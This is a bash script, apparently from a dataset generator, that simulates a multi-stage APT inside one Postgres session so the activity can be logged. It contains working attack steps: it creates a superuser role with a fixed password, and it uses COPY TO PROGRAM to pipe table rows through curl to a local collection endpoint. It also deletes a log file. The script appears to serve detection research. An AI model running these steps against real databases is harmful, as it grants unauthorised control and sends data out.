#!/bin/bash
# Template: Multi-Stage APT, all inside one Postgres session (one Session ID).
set -euo pipefail
cd "$(dirname "${BASH_SOURCE[0]}")"
source ./_identity_lib.sh
casce_new_identity

echo "Simulating Multi-Stage APT Attack... identity=${CASCE_USER}@${CASCE_IP}"

# Delay ranges (seconds) between each stage -- randomized per run instead of
# a fixed 1s, so timing varies across generated instances.
d1=$(awk -v mn=0.5 -v mx=2.0 'BEGIN{srand(); printf "%.2f", mn+rand()*(mx-mn)}')
d2=$(awk -v mn=0.5 -v mx=2.0 'BEGIN{srand(); printf "%.2f", mn+rand()*(mx-mn)}')

# Everything between <<EOF and EOF runs continuously inside the EXACT SAME
# Postgres session (same Session ID). The SET statements tag this whole
# session with the run's synthetic identity.
psql -U postgres -d casce_tpcb <<EOF > /dev/null 2>&1
$(casce_sql_prelude)

-- Stage 1: Database Enumeration (Benign Noise)
SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';
SELECT 1 FROM pg_sleep(${d1}); -- Emulate human read delay (randomized)

-- Stage 2: Database Privilege Escalation (Malicious DB Layer)
CREATE ROLE apt_hacker_${CASCE_USER} SUPERUSER LOGIN PASSWORD 'apt_pass';
SELECT 1 FROM pg_sleep(${d2});

-- Stage 3: Cross-layer payload delivery (Malicious OS Layer)
COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';
EOF

# Stage 4: OS-only Sabotage (Cat 1) happens immediately after DB disconnect
sh -c "rm -f /tmp/some_fake_log.log 2>/dev/null || true"

/dataset_workspace/logger.sh mark_attack "attack_multi_stage_apt" end

echo "Multi-stage APT simulated successfully inside a unified session."
